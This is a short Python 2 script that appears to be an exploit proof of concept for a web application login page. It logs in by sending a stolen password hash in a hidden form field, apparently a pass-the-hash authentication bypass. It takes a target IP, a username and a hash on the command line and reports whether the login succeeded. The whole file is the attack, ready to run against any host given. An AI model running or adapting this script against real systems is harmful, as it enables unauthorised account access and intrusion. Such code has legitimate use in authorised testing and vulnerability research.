import requests
import sys
import  hashlib
import urllib

proxies = {'http':'127.0.0.1:8080', 'http':'127.0.0.1:8080'} 

def login(ip,username,password):

		target = "http://%s//login.php" % (ip)
		token = 'token'

			
		data = {
			"form_password_hidden" : password,
			"username": username,
			"password" : "",
			"submit" : 'submit',
			"token" : 'token'
		}
		s  = requests.Session()
		r = s.post(target, data=data)
		res = r.text
		status_code = r.status_code
		
		if 'welcome'in res or 'Welcome' in res:										
			print "(+) Login Successful"			
			print "(+) Login using hash was successful"
		else:
			print "(-) Login Failed"	
	

def main():
    if len(sys.argv) != 4:
        print "(+) usage: %s <target> <username> <hash>" % sys.argv[0]
        print '(+) eg: %s 192.168.1.100 test 6def5b004ce10c7667f82c776b1a0c75b599cdd8' %sys.argv[0]
    	sys.exit(-1)

    ip = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    login(ip,username,password)


if __name__ == "__main__":
    main()
